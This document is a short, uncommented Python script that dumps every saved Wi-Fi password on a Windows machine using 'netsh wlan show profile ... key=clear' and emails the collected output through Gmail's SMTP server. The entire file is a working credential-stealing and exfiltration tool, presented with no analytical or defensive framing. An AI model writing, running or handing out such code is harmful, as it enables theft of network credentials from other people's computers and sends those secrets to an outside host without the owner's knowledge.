#!/usr/bin/python

import subprocess, smtplib, re

show_pro = "netsh wlan show profile"
wifi = subprocess.check_output(show_pro, shell=True)
wifi_list = re.findall('(?:Profile\s*:\s)(.*)',wifi.decode("UTF-8"))

global passwd
passwd = ""

for wlan in wifi_list:
    strip_r = wlan.strip('\r')
    passwd_find = "netsh wlan show profile " + "\"" + str(strip_r) + "\"" + " key=clear"
    wifi_result = subprocess.check_output(passwd_find, shell=True)
    passwd += str(wifi_result)

    # Uncomment the line below to dump passwords to terminal
    # print(wifi_result)

def send_mail():
    email = input("Enter your Gmail username: ")
    password = input("Enter your Gmail password: ")
    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
    except:
        print("Error: Verify Gmail SMTP settings.")
        exit()
    try:
        server.login(email, password)
    except:
        print("Error: Authentication error.")
    try:
        server.sendmail(email, email, passwd)
    except:
        print("Error: Failed sending e-mail.")
    print("Done!")
    server.quit()

send_mail()
